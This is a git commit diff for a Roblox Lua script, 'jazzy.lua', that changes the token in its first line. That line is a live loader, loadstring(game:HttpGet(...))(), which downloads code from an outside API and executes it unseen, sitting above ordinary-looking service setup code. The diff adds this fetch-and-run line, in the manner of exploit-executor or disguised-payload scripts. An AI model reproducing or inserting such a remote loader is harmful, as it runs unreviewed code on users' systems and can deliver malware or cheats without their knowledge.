3b178c8172837d448ec950e278ed61d4a1ef347c
wweeweelala <messwithpred@gmail.com>
2026-03-31 01:01:00 +0100

    Update jazzy.lua

--- jazzy.lua
+++ jazzy.lua
@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IiIsImtpbmQiOiJsb2FkZXIifQ"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
